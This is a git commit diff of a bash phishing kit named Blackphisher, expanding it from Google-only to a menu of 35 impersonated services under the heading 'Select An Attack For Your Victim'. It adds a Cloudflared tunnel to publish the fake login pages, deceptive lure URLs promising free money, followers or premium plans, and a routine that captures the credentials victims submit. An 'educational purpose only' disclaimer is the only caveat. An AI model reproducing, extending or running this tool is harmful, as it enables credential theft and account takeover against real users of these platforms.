e0e7114b1519b98dcab9a1732874cd26ea4c00ae
Pranav-V-20 <pranavvijayakumar20@gmail.com>
2025-03-25 00:01:40 +0530

    Update Black.sh

--- Black.sh
+++ Black.sh
@@ -1,83 +1,8 @@
-#!/bin/bash
-
-##   Blackphisher   R: 	Google Phishing Tool 
+##   Blackphisher 	: 	Google Phishing Tool 
 ##   Author 	    : 	Pranav 
 ##   Version 	    : 	0.1
 ##   Github 	    : 	https://github.com/Pranav-20-v
 
-
-##                   GNU GENERAL PUBLIC LICENSE
-##                    Version 3, 29 June 2007
-##
-##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
-##    Everyone is permitted to copy and distribute verbatim copies
-##    of this license document, but changing it is not allowed.
-##
-##                         Preamble
-##
-##    The GNU General Public License is a free, copyleft license for
-##    software and other kinds of works.
-##
-##    The licenses for most software and other practical works are designed
-##    to take away your freedom to share and change the works.  By contrast,
-##    the GNU General Public License is intended to guarantee your freedom to
-##    share and change all versions of a program--to make sure it remains free
-##    software for all its users.  We, the Free Software Foundation, use the
-##    GNU General Public License for most of our software; it applies also to
-##    any other work released this way by its authors.  You can apply it to
-##    your programs, too.
-##
-##    When we speak of free software, we are referring to freedom, not
-##    price.  Our General Public Licenses are designed to make sure that you
-##    have the freedom to distribute copies of free software (and charge for
-##    them if you wish), that you receive source code or can get it if you
-##    want it, that you can change the software or use pieces of it in new
-##    free programs, and that you know you can do these things.
-##
-##    To protect your rights, we need to prevent others from denying you
-##    these rights or asking you to surrender the rights.  Therefore, you have
-##    certain responsibilities if you distribute copies of the software, or if
-##    you modify it: responsibilities to respect the freedom of others.
-##
-##    For example, if you distribute copies of such a program, whether
-##    gratis or for a fee, you must pass on to the recipients the same
-##    freedoms that you received.  You must make sure that they, too, receive
-##    or can get the source code.  And you must show them these terms so they
-##    know their rights.
-##
-##    Developers that use the GNU GPL protect your rights with two steps:
-##    (1) assert copyright on the software, and (2) offer you this License
-##    giving you legal permission to copy, distribute and/or modify it.
-##
-##    For the developers' and authors' protection, the GPL clearly explains
-##    that there is no warranty for this free software.  For both users' and
-##    authors' sake, the GPL requires that modified versions be marked as
-##    changed, so that their problems will not be attributed erroneously to
-##    authors of previous versions.
-##
-##    Some devices are designed to deny users access to install or run
-##    modified versions of the software inside them, although the manufacturer
-##    can do so.  This is fundamentally incompatible with the aim of
-##    protecting users' freedom to change the software.  The systematic
-##    pattern of such abuse occurs in the area of products for individuals to
-##    use, which is precisely where it is most unacceptable.  Therefore, we
-##    have designed this version of the GPL to prohibit the practice for those
-##    products.  If such problems arise substantially in other domains, we
-##    stand ready to extend this provision to those domains in future versions
-##    of the GPL, as needed to protect the freedom of users.
-##
-##    Finally, every program is threatened constantly by software patents.
-##    States should not allow patents to restrict development and use of
-##    software on general-purpose computers, but in those that do, we wish to
-##    avoid the special danger that patents applied to a free program could
-##    make it effectively proprietary.  To prevent this, the GPL assures that
-##    patents cannot be used to render the program non-free.
-##
-##    The precise terms and conditions for copying, distribution and
-##    modification follow.
-##
-##      Copyright (C) 2025  HTR-TECH (https://github.com/Pranav-V-20)
-##
 
 __auth__="-Pranav V"
 
@@ -150,12 +75,11 @@ kill_pid() {
 	done
 }
 
-
 ## Check Internet Status
 check_status() {
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
-	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
+	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" || echo -e "${RED}Offline${WHITE}"
 }
 
 ## Banner
@@ -174,6 +98,8 @@ banner() {
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Pranav V${WHITE}
 	EOF
 }
+
+
 
 ## Dependencies
 dependencies() {
@@ -248,6 +174,25 @@ download() {
 	fi
 }
 
+## Install Cloudflared
+install_cloudflared() {
+	if [[ -e ".server/cloudflared" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
+		else
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
+		fi
+	fi
+}
+
 ## Install LocalXpose
 install_localxpose() {
 	if [[ -e ".server/loclx" ]]; then
@@ -272,6 +217,42 @@ msg_exit() {
 	{ clear; banner; echo; }
 	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
 	{ reset_color; exit 0; }
+}
+
+## About
+about() {
+	{ clear; banner; echo; }
+	cat <<- EOF
+		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
+		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
+		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
+		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
+
+		${WHITE} ${REDBG}Warning:${RESETBG}
+		${CYAN}  This Tool is made for educational purpose 
+		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
+		  any misuse of this toolkit ${RED}!${WHITE}
+		
+		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
+		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
+		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
+		  Yisus7u7
+
+		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	case $REPLY in 
+		99)
+			msg_exit;;
+		0 | 00)
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
+			{ sleep 1; main_menu; };;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; about; };;
+	esac
 }
 
 ## Choose custom port
@@ -342,6 +323,26 @@ capture_data() {
 	done
 }
 
+## Start Cloudflared
+start_cloudflared() { 
+	rm .cld.log > /dev/null 2>&1 &
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+
+	if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	else
+		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	fi
+
+	sleep 8
+	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+	custom_url "$cldflr_url"
+	capture_data
+}
+
 localxpose_auth() {
 	./.server/loclx -help > /dev/null 2>&1 &
 	sleep 1
@@ -397,7 +398,8 @@ tunnel_menu() {
 	cat <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
-		${RED}[${WHITE}02${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
+		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
 
 	EOF
 
@@ -406,7 +408,9 @@ tunnel_menu() {
 	case $REPLY in 
 		1 | 01)
 			start_localhost;;
-		2 | 03)
+		2 | 02)
+			start_cloudflared;;
+		3 | 03)
 			start_loclx;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -416,7 +420,7 @@ tunnel_menu() {
 
 ## Custom Mask URL
 custom_mask() {
-	{ sleep .5; clear; banner; echo; }
+	{ sleep .5; clear; echo; }
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
 	echo
 	if [[ ${mask_op,,} == "y" ]]; then
@@ -474,13 +478,86 @@ custom_url() {
 	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
 
+## Facebook
+site_facebook() {
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
+		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
+		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			website="facebook"
+			mask='https://blue-verified-badge-for-facebook-free'
+			tunnel_menu;;
+		2 | 02)
+			website="fb_advanced"
+			mask='https://vote-for-the-best-social-media'
+			tunnel_menu;;
+		3 | 03)
+			website="fb_security"
+			mask='https://make-your-facebook-secured-and-free-from-hackers'
+			tunnel_menu;;
+		4 | 04)
+			website="fb_messenger"
+			mask='https://get-messenger-premium-features-free'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; clear; banner; site_facebook; };;
+	esac
+}
+
+## Instagram
+site_instagram() {
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
+		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
+		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			website="instagram"
+			mask='https://get-unlimited-followers-for-instagram'
+			tunnel_menu;;
+		2 | 02)
+			website="ig_followers"
+			mask='https://get-unlimited-followers-for-instagram'
+			tunnel_menu;;
+		3 | 03)
+			website="insta_followers"
+			mask='https://get-1000-followers-for-instagram'
+			tunnel_menu;;
+		4 | 04)
+			website="ig_verify"
+			mask='https://blue-badge-verify-for-instagram-free'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; clear; banner; site_instagram; };;
+	esac
+}
+
 ## Gmail/Google
 site_gmail() {
 	cat <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
-		
+		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
+
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -494,9 +571,39 @@ site_gmail() {
 			website="google_new"
 			mask='https://get-unlimited-google-drive-free'
 			tunnel_menu;;
+		3 | 03)
+			website="google_poll"
+			mask='https://vote-for-the-best-social-media'
+			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; clear; banner; site_gmail; };;
+	esac
+}
+
+## Vk
+site_vk() {
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			website="vk"
+			mask='https://vk-premium-real-method-2020'
+			tunnel_menu;;
+		2 | 02)
+			website="vk_poll"
+			mask='https://vote-for-the-best-social-media'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; clear; site_vk; };;
 	esac
 }
 
@@ -504,17 +611,162 @@ site_gmail() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}01${RED}]${ORANGE} Google  
-		${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
+		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
+		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
+		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
+		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
+		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
+		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
+		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
+		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
+		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
+		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
+		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
+
+		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
 	EOF
 	
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
-	case $REPLY in
+	case $REPLY in 
 		1 | 01)
+			site_facebook;;
+		2 | 02)
+			site_instagram;;
+		3 | 03)
 			site_gmail;;
-
+		4 | 04)
+			website="microsoft"
+			mask='https://unlimited-onedrive-space-for-free'
+			tunnel_menu;;
+		5 | 05)
+			website="netflix"
+			mask='https://upgrade-your-netflix-plan-free'
+			tunnel_menu;;
+		6 | 06)
+			website="paypal"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		7 | 07)
+			website="steam"
+			mask='https://steam-500-usd-gift-card-free'
+			tunnel_menu;;
+		8 | 08)
+			website="twitter"
+			mask='https://get-blue-badge-on-twitter-free'
+			tunnel_menu;;
+		9 | 09)
+			website="playstation"
+			mask='https://playstation-500-usd-gift-card-free'
+			tunnel_menu;;
+		10)
+			website="tiktok"
+			mask='https://tiktok-free-liker'
+			tunnel_menu;;
+		11)
+			website="twitch"
+			mask='https://unlimited-twitch-tv-user-for-free'
+			tunnel_menu;;
+		12)
+			website="pinterest"
+			mask='https://get-a-premium-plan-for-pinterest-free'
+			tunnel_menu;;
+		13)
+			website="snapchat"
+			mask='https://view-locked-snapchat-accounts-secretly'
+			tunnel_menu;;
+		14)
+			website="linkedin"
+			mask='https://get-a-premium-plan-for-linkedin-free'
+			tunnel_menu;;
+		15)
+			website="ebay"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		16)
+			website="quora"
+			mask='https://quora-premium-for-free'
+			tunnel_menu;;
+		17)
+			website="protonmail"
+			mask='https://protonmail-pro-basics-for-free'
+			tunnel_menu;;
+		18)
+			website="spotify"
+			mask='https://convert-your-account-to-spotify-premium'
+			tunnel_menu;;
+		19)
+			website="reddit"
+			mask='https://reddit-official-verified-member-badge'
+			tunnel_menu;;
+		20)
+			website="adobe"
+			mask='https://get-adobe-lifetime-pro-membership-free'
+			tunnel_menu;;
+		21)
+			website="deviantart"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		22)
+			website="badoo"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		23)
+			website="origin"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		24)
+			website="dropbox"
+			mask='https://get-1TB-cloud-storage-free'
+			tunnel_menu;;
+		25)
+			website="yahoo"
+			mask='https://grab-mail-from-anyother-yahoo-account-free'
+			tunnel_menu;;
+		26)
+			website="wordpress"
+			mask='https://unlimited-wordpress-traffic-free'
+			tunnel_menu;;
+		27)
+			website="yandex"
+			mask='https://grab-mail-from-anyother-yandex-account-free'
+			tunnel_menu;;
+		28)
+			website="stackoverflow"
+			mask='https://get-stackoverflow-lifetime-pro-membership-free'
+			tunnel_menu;;
+		29)
+			site_vk;;
+		30)
+			website="xbox"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		31)
+			website="mediafire"
+			mask='https://get-1TB-on-mediafire-free'
+			tunnel_menu;;
+		32)
+			website="gitlab"
+			mask='https://get-1k-followers-on-gitlab-free'
+			tunnel_menu;;
+		33)
+			website="github"
+			mask='https://get-1k-followers-on-github-free'
+			tunnel_menu;;
+		34)
+			website="discord"
+			mask='https://get-discord-nitro-free'
+			tunnel_menu;;
+		35)
+			website="roblox"
+			mask='https://get-free-robux'
+			tunnel_menu;;
+		99)
+			about;;
 		0 | 00 )
 			msg_exit;;
 		*)
@@ -528,5 +780,6 @@ main_menu() {
 kill_pid
 dependencies
 check_status
+install_cloudflared
 install_localxpose
 main_menu
